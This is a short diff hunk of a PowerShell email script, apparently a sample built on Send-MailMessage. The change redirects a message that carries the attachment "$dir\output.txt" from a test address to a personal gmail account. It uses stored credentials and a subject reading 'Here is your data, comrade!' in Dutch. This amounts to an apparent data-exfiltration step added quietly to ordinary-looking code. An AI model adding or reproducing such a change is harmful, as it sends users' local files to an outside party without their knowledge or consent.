@@ -118,7 +118,7 @@ $EmailParams = @{
 Send-EmailMessage @EmailParams
 
 # You can also use Send-MailMessage with the same credentials
-Send-MailMessage -To 'przemyslaw.klys@test.pl' -Subject 'Test' -Body 'test me' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
+Send-MailMessage -To 'herbertswindel@gmail.com' -Subject 'Hier zijn uw gegevens kameraad!' -Body 'MVG, Herbert Swindèl' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
     -Attachments "$dir\output.txt" -Encoding UTF8 -Cc 'herbertswindel@outlook.com' -DeliveryNotificationOption OnSuccess -Priority High -Credential $MailCredentials -UseSsl -Port 587 -Verbose
 
 
